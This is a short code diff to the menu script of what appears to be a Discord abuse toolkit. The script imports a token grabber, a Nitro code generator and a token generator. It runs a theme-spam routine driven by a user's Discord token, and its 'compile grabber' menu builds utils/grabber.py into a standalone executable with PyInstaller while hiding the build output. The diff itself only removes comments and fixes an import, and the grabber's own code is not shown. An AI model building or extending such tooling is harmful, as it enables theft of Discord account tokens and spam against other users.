@@ -14,7 +14,6 @@ from utils.nitro_generator import run_nitro_generator
 from utils.token_generator import run_token_generator
 from utils.grabber import get_token
 
-# Initialize colorama
 init()
 
 RESET = '\033[0m'
@@ -371,7 +370,7 @@ def theme_spam_menu():
 
     debug = input(rgb(255,32,32) + center("Enable debug mode? (y/n): ") + RESET).lower() == 'y'
 
-    from theme_spammer import spam_theme
+    from utils.theme_spammer import spam_theme
     spam_theme(token, amount, interval, debug)
 
 def ask_token(prompt="Enter Discord Token: "):
@@ -431,7 +430,6 @@ def compile_grabber_menu():
         pretty_print("Compilation cancelled.", (255,64,64))
         return
     
-    # Check for required dependencies
     missing_deps = []
     try:
         __import__('psutil')
@@ -477,7 +475,6 @@ def compile_grabber_menu():
         
         loading_spinner()
         
-        # Use PyInstaller to compile the grabber
         output_dir = os.path.join(os.getcwd(), 'compiled')
         if not os.path.exists(output_dir):
             os.makedirs(output_dir)
@@ -498,7 +495,6 @@ def compile_grabber_menu():
             'utils/grabber.py'
         ]
         
-        # You might want to hide the console output when building
         subprocess.run(compile_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
         status_message = "Grabber compiled successfully!"
